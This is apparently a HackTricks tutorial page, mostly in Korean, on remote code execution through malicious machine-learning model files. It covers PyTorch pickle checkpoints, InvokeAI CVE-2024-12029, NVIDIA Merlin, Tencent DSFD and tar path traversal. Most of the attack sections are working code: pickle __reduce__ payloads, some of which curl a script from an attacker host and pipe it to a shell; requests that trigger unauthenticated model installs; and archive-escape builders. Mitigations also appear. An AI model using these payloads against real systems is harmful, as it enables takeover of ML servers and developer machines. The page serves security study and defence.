# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning 모델은 보통 ONNX, TensorFlow, PyTorch 등 다양한 포맷으로 공유됩니다. 이러한 모델들은 개발자 머신이나 프로덕션 시스템에 로드되어 사용됩니다. 일반적으로 모델에 악성 코드를 포함하지 않아야 하지만, 모델이 의도된 기능으로서 또는 모델 로딩 라이브러리의 취약점 때문에 시스템에서 임의의 코드를 실행하는 데 사용될 수 있는 경우가 있습니다.

At the time of the writting these are some examples of this type of vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | 악성 pickle이 모델 체크포인트에 포함되어 코드 실행으로 이어짐 (`weights_only` 보호 우회)                                                  | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + 악성 모델 다운로드로 코드 실행 유발; management API의 Java deserialization RCE                                                   | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | 신뢰할 수 없는 체크포인트가 `load_model_trainer_states_from_checkpoint` 동안 pickle reducer를 트리거 → ML 워커에서 코드 실행              | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | YAML에서 모델을 로드할 때 `yaml.unsafe_load` 사용 (코드 실행) <br> Lambda 레이어가 포함된 모델 로드 시 임의의 Python 코드 실행            | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | 조작된 `.tflite` 모델이 정수 오버플로를 유발 → 힙 손상 (잠재적 RCE)                                                                    | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | `joblib.load`로 모델을 로드하면 공격자의 `__reduce__` 페이로드가 포함된 pickle이 실행됨                                                 | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load`의 기본값이 피클된 객체 배열을 허용 – 악성 `.npy/.npz`가 코드 실행을 유발                                                   | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX 모델의 external-weights 경로가 디렉토리를 벗어날 수 있음 (임의 파일 읽기) <br> 악성 ONNX 모델 tar가 임의 파일을 덮어쓰게 하여 RCE로 이어짐 | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | custom operator가 공격자의 네이티브 코드를 요구할 수 있음; 복잡한 모델 그래프가 로직을 악용하여 의도하지 않은 연산을 실행하도록 함      | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | `--model-control`이 활성화된 상태에서 모델 로드 API를 사용하면 상대 경로 트래버설로 파일을 쓰게 되어 (예: `.bashrc` 덮어쓰기) RCE 가능성 | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | 손상된 GGUF 모델 파일이 파서에서 힙 버퍼 오버플로를 유발하여 피해자 시스템에서 임의 코드 실행을 가능하게 함                              | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Lambda 레이어가 포함된 악성 HDF5 (`.h5`) 모델은 여전히 로드 시 코드가 실행됨 (Keras safe_mode가 오래된 포맷을 커버하지 않음 – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | 많은 ML 도구들(예: pickle 기반 모델 포맷, Python `pickle.load`)은 완화되지 않으면 모델 파일에 포함된 임의의 코드를 실행함                   | |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI`는 Stable-Diffusion용으로 널리 사용되는 오픈소스 웹 인터페이스입니다. Versions **5.3.1 – 5.4.2**는 사용자가 임의의 URL에서 모델을 다운로드하고 로드할 수 있게 하는 REST 엔드포인트 `/api/v2/models/install`을 노출합니다.

Internally the endpoint eventually calls:
```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```
When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  제공된 콘텐츠가 사용자 제어 URL에서 직접 오기 때문에, 공격자는 체크포인트 안에 사용자 정의 `__reduce__` 메서드를 가진 악의적 객체를 삽입할 수 있습니다; 해당 메서드는 **during deserialization** 동안 실행되어 InvokeAI 서버에서 **remote code execution (RCE)**으로 이어집니다.

The vulnerability was assigned **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. 악성 checkpoint 생성:
```python
# payload_gen.py
import pickle, torch, os

class Payload:
def __reduce__(self):
return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
pickle.dump(Payload(), f)
```
2. 제어하는 HTTP 서버에 `payload.ckpt`을 호스팅하세요 (예: `http://ATTACKER/payload.ckpt`).
3. 취약한 endpoint를 트리거하세요 (인증 불필요):
```python
import requests

requests.post(
"http://TARGET:9090/api/v2/models/install",
params={
"source": "http://ATTACKER/payload.ckpt",  # remote model URL
"inplace": "true",                         # write inside models dir
# the dangerous default is scan=false → no AV scan
},
json={},                                         # body can be empty
timeout=5,
)
```
4. InvokeAI가 파일을 다운로드하면 `torch.load()`를 호출합니다 → `os.system` gadget가 실행되어 공격자는 InvokeAI 프로세스 컨텍스트에서 코드 실행을 획득합니다.

Ready-made exploit: **Metasploit** 모듈 `exploit/linux/http/invokeai_rce_cve_2024_12029`이 전체 흐름을 자동화합니다.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan 플래그 기본값 **false**)  
•  공격자가 `/api/v2/models/install`에 접근할 수 있음  
•  프로세스가 셸 명령을 실행할 권한을 가짐

#### Mitigations

* **InvokeAI ≥ 5.4.3**로 업그레이드 – 해당 패치에서 기본적으로 `scan=True`로 설정하고 역직렬화 전에 맬웨어 스캐닝을 수행합니다.  
* 체크포인트를 프로그래밍 방식으로 로드할 때 `torch.load(file, weights_only=True)` 또는 새로운 [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) 헬퍼를 사용하세요.  
* 모델 소스에 대해 허용 목록(allow-lists) / 서명을 적용하고 서비스를 최소 권한으로 실행하세요.

> ⚠️ 기억하세요 **어떤** Python pickle 기반 형식(많은 `.pt`, `.pkl`, `.ckpt`, `.pth` 파일 포함)은 신뢰할 수 없는 소스에서 역직렬화하는 것이 본질적으로 안전하지 않습니다.

---

구버전 InvokeAI를 리버스 프록시 뒤에서 계속 실행해야 하는 경우의 임시 완화 예:
```nginx
location /api/v2/models/install {
deny all;                       # block direct Internet access
allow 10.0.0.0/8;               # only internal CI network can call it
}
```
### 🆕 NVIDIA Merlin Transformers4Rec RCE — 안전하지 않은 `torch.load`를 통한 취약점 (CVE-2025-23298)

NVIDIA의 Transformers4Rec(Merlin의 일부)는 사용자 제공 경로에 대해 직접 `torch.load()`를 호출하는 안전하지 않은 체크포인트 로더를 노출했습니다. `torch.load`가 Python `pickle`에 의존하기 때문에, 공격자가 조작한 체크포인트는 역직렬화 중 reducer를 통해 임의의 코드를 실행할 수 있습니다.

취약 경로(패치 전): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

이것이 RCE로 이어지는 이유: Python의 pickle에서는 객체가 reducer (`__reduce__`/`__setstate__`)를 정의하여 호출 가능한 객체와 인자를 반환할 수 있습니다. 역직렬화 과정에서 그 호출 가능한 객체가 실행됩니다. 이런 객체가 체크포인트에 포함되어 있으면, 가중치가 사용되기 전에 실행됩니다.

최소 악성 체크포인트 예:
```python
import torch

class Evil:
def __reduce__(self):
import os
return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
"model_state_dict": Evil(),
"trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```
Delivery vectors and blast radius:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`. The new loader validates types/fields and prevents arbitrary callables from being invoked during load.

Defensive guidance specific to PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- 모델 로드:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent의 FaceDetection-DSFD는 사용자 제어 데이터를 deserializes하는 `resnet` 엔드포인트를 노출합니다. ZDI는 remote attacker가 피해자를 강제로 악성 페이지/파일을 로드하게 한 뒤, 그 페이지가 조작된 serialized blob을 해당 엔드포인트로 전송하게 하고 `root`로서 deserialization을 트리거하여 완전한 침해(full compromise)를 초래할 수 있음을 확인했습니다.

The exploit flow mirrors typical pickle abuse:
```python
import pickle, os, requests

class Payload:
def __reduce__(self):
return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
headers={"Content-Type": "application/octet-stream"})
```
Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport was HTTP, WebSocket, or a file dropped into a watched directory.

## 모델을 통한 Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

예를 들어, 다음 코드를 사용하면 모델이 로드될 때 `/tmp` 디렉터리에 파일을 생성하는 모델을 만들 수 있습니다:
```python
import tarfile

def escape(member):
member.name = "../../tmp/hacked"     # break out of the extract dir
return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
tf.add("harmless.txt", filter=escape)
```
또는 다음 코드를 사용하면 모델이 로드될 때 `/tmp` 디렉터리에 대한 심볼릭 링크를 생성하도록 만들 수 있습니다:
```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
member.type, member.linkname = tarfile.SYMTYPE, TARGET
return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
tf.add(PAYLOAD)                      # rides the symlink
```
### 심층 분석: Keras .keras deserialization and gadget hunting

다음 주제(.keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8, post-fix gadget discovery inside the allowlist)에 관한 집중 가이드는 다음을 참조하세요:

{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## 참고자료

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)

{{#include ../banners/hacktricks-training.md}}
